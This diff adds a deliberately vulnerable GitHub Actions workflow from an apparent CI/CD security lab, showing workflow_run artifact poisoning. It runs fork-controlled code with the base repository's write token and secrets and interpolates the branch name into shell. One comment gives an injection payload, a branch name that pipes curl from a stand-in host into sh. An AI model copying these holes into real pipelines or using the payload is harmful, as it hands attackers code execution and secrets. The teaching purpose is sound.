@@ -1,0 +1,74 @@
+# attacks/11-workflow-run-poisoning/comment.yml  —  VULNERABLE (privileged consumer)
+#
+# Scenario 11 — workflow_run artifact poisoning (CICD-SEC-4, MITRE T1195).
+#
+# This workflow runs on `workflow_run`: it fires AFTER "PR build" finishes.
+# Unlike the build job, a `workflow_run` handler runs in the context of the
+# BASE repository — on the default branch, with the base repo's secrets and a
+# read/write GITHUB_TOKEN — even when the run that triggered it came from a
+# fork pull request. GitHub introduced `workflow_run` precisely so that a
+# privileged follow-up (commenting, labelling, publishing) could react to an
+# untrusted build without handing the fork those privileges.
+#
+# The trap: the fork still controls everything the build produced. This job
+# takes that attacker-controlled material and (1) downloads it, (2) checks out
+# the fork's branch, (3) EXECUTES code out of it, and (4) splices the fork's
+# branch name straight into a shell command — all while holding the base
+# repo's write token and secrets. Any of 1–4 hands a fork-PR author code
+# execution in a privileged context. This is the artifact-poisoning variant of
+# a pwn request.
+#
+# Every credential here is a dummy lab value.
+
+name: PR comment
+
+on:
+  workflow_run:
+    workflows: ["PR build"]
+    types: [completed]
+
+# Blanket write + secrets, available to a job that consumes fork output.
+permissions:
+  contents: write
+  pull-requests: write
+
+jobs:
+  comment:
+    runs-on: ubuntu-latest
+    if: github.event.workflow_run.conclusion == 'success'
+    steps:
+      # (1) Pull the artifact the fork-PR build uploaded, from the triggering
+      #     run. These bytes are entirely attacker-controlled.
+      - name: Download PR build
+        uses: actions/download-artifact@d3f86a106a0bac45b974a628896c90dbdf5c8093 # v4.3.0
+        with:
+          name: pr-build
+          path: pr-build
+          run-id: ${{ github.event.workflow_run.id }}
+          github-token: ${{ secrets.GITHUB_TOKEN }}
+
+      # (2) Check out the fork's branch in the privileged context. On its own
+      #     this already reintroduces the pwn-request problem via workflow_run.
+      - name: Checkout PR head
+        uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4.4.0
+        with:
+          ref: ${{ github.event.workflow_run.head_branch }}
+
+      # (3) Run code straight out of the downloaded artifact. scripts/comment.js
+      #     came from the fork; here it runs with the base repo's write token
+      #     and whatever secrets this workflow can see.
+      - name: Post-process build
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          DEPLOY_KEY: ${{ secrets.DUMMY_DEPLOY_KEY }}
+        run: |
+          cd pr-build
+          npm ci
+          node ./scripts/comment.js
+
+      # (4) Untrusted workflow_run context interpolated into the shell. A
+      #     branch named `";curl evil|sh;"` breaks out of the echo.
+      - name: Announce
+        run: |
+          echo "Posted results for branch ${{ github.event.workflow_run.head_branch }}"
+          echo "Title: ${{ github.event.workflow_run.display_title }}"
